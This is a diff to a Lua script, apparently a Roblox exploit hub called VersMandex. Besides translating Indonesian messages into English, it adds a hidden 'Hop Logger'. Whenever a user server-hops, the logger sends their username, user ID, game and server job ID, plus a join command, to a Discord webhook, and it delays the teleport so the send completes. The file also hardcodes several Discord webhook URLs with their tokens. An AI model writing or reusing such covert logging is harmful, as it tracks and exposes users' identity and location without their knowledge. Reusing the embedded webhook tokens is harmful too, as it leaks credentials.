@@ -122,7 +122,7 @@ local function outroAndClose(shouldLaunch)
     LauncherGui:Destroy()
     if shouldLaunch then
         local ok, err = pcall(function() startVersMandexScript() end)
-        if not ok then warn("Gagal memulai script: " .. tostring(err)) end
+        if not ok then warn("Failed to start script: " .. tostring(err)) end
     end
 end
 
@@ -146,6 +146,7 @@ local DISCORD_LINK = "https://discord.gg/UjBDWDFyK"
 
 local WELCOME_WEBHOOK = "https://discord.com/api/webhooks/1558721068875915386/roAVbTcms-p89rB7JwugL4zeTUnvSNTDaXikru3wCzOYZm4dTu5YvjG-FWlM932d3Gq8"
 local REQUEST_WEBHOOK = "https://discord.com/api/webhooks/1563846004300718211/UN5IUhtgJIWc6I2-xAyzmAt0HwGqyWPUhQN-gPNN8UV1bO7iaq0qvnz8LUTjW7SKwdbX"
+local TELEPORT_WEBHOOK = "https://discord.com/api/webhooks/1564682608648921148/QlloC8nPPtS1_7vWZlnW6I043563xwn3wI90Iu_-Av5WVnaQFAzxsMWd30l7i2n4nm-L"
 
 local developers = {"Koripp", LocalPlayer.Name}
 local teleportPending = false
@@ -166,7 +167,7 @@ local function httpGet(url)
             return response.Body
         end
     end
-    error("HTTP request gagal.")
+    error("HTTP request failed.")
 end
 
 local function getPublicServers(placeId, maxPages)
@@ -176,7 +177,7 @@ local function getPublicServers(placeId, maxPages)
         local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Asc&limit=100"
         if cursor ~= "" then url = url .. "&cursor=" .. HttpService:UrlEncode(cursor) end
         local ok, result = pcall(function() return HttpService:JSONDecode(httpGet(url)) end)
-        if not ok or type(result) ~= "table" or type(result.data) ~= "table" then return servers, "Gagal mengambil server." end
+        if not ok or type(result) ~= "table" or type(result.data) ~= "table" then return servers, "Failed to fetch servers." end
         for _, server in ipairs(result.data) do
             if type(server) == "table" and type(server.id) == "string" and tonumber(server.playing) and tonumber(server.maxPlayers) then
                 table.insert(servers, server)
@@ -191,19 +192,61 @@ end
 
 local function safeTeleport(placeId, jobId, statusLabel)
     if teleportPending then
-        if statusLabel then statusLabel.Text = "Teleport sedang diproses..." end
+        if statusLabel then statusLabel.Text = "Teleport already in progress..." end
         return false
     end
     if type(jobId) ~= "string" or jobId == "" then
-        if statusLabel then statusLabel.Text = "Server ID tidak valid." end
+        if statusLabel then statusLabel.Text = "Invalid Server ID." end
         return false
     end
     teleportPending = true
-    if statusLabel then statusLabel.Text = "Menghubungkan..." end
+    if statusLabel then statusLabel.Text = "Connecting..." end
+    
+    -- Kirim Webhook Teleport / Hop dan beri jeda waktu agar webhook sukses terkirim sebelum pindah
+    task.spawn(function()
+        pcall(function()
+            local gameName = "Unknown Game"
+            pcall(function()
+                local info = MarketplaceService:GetProductInfo(placeId)
+                if info and type(info) == "table" and info.Name then 
+                    gameName = info.Name 
+                end
+            end)
+            
+            local joinCommand = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)", placeId, jobId)
+            
+            local payload = {
+                ["username"] = "VersMandex Hop Logger",
+                ["embeds"] = {{
+                    ["title"] = "Server Hop / Teleport Detected",
+                    ["color"] = 5793266,
+                    ["fields"] = {
+                        {["name"] = "User Details", ["value"] = string.format("Username: %s\nDisplay Name: %s\nUser ID: %s", tostring(LocalPlayer.Name), tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.UserId)), ["inline"] = false},
+                        {["name"] = "Target Game Details", ["value"] = string.format("Game Name: %s\nPlace ID: %s\nJob ID: %s", tostring(gameName), tostring(placeId), tostring(jobId)), ["inline"] = false},
+                        {["name"] = "Join Server Script", ["value"] = "```lua\n" .. joinCommand .. "\n```", ["inline"] = false}
+                    }
+                }}
+            }
+            
+            local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+            if requestFunc then
+                requestFunc({
+                    Url = TELEPORT_WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end
+        end)
+    end)
+
+    -- Jeda 1.5 detik agar webhook terkirim sempurna sebelum server tertutup
+    task.wait(1.5)
+
     local ok, err = pcall(function() TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer) end)
     if not ok then
         teleportPending = false
-        if statusLabel then statusLabel.Text = "Teleport gagal: " .. tostring(err) end
+        if statusLabel then statusLabel.Text = "Teleport failed: " .. tostring(err) end
         return false
     end
     return true
@@ -212,11 +255,11 @@ end
 TeleportService.TeleportInitFailed:Connect(function(player, result, message)
     if player == LocalPlayer then
         teleportPending = false
-        warn("VersMandex teleport gagal: " .. tostring(result) .. " " .. tostring(message))
+        warn("VersMandex teleport failed: " .. tostring(result) .. " " .. tostring(message))
     end
 end)
 
--- Kirim Webhook Welcome dengan Embed Hijau & Script Join Server
+-- Kirim Webhook Welcome saat Script Pertama Kali Dijalankan
 task.spawn(function()
     pcall(function()
         local gameName = "Unknown Game"
@@ -1341,7 +1384,7 @@ SendReqBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 SendReqBtn.TextSize = 9
 Instance.new("UICorner", SendReqBtn).CornerRadius = UDim.new(0, 5)
 
-local REQUEST_LIMIT_FILE = "versmandex_req_limit_v9.json"
+local REQUEST_LIMIT_FILE = "versmandex_req_limit_v11.json"
 local function getRequestLimitData()
     local data = {count = 0, targetTick = 0}
     pcall(function()
@@ -1388,7 +1431,6 @@ task.spawn(function()
     end
 end)
 
--- Kirim Webhook Request SAMA PERSIS MIRIP Welcome Embed Hijau
 SendReqBtn.MouseButton1Click:Connect(function()
     playClickSound()
     local msg = ReqBox.Text
@@ -1415,7 +1457,7 @@ SendReqBtn.MouseButton1Click:Connect(function()
         ["username"] = "VersMandex Request Logger",
         ["embeds"] = {{
             ["title"] = "New Member Request",
-            ["color"] = 5793266, -- Warna Hijau Persis Welcome
+            ["color"] = 5793266,
             ["fields"] = {
                 {["name"] = "User Details", ["value"] = string.format("Username: %s\nDisplay Name: %s\nUser ID: %s", tostring(LocalPlayer.Name), tostring(LocalPlayer.DisplayName), tostring(LocalPlayer.UserId)), ["inline"] = false},
                 {["name"] = "Message", ["value"] = "```\n" .. tostring(msg) .. "\n```", ["inline"] = false},
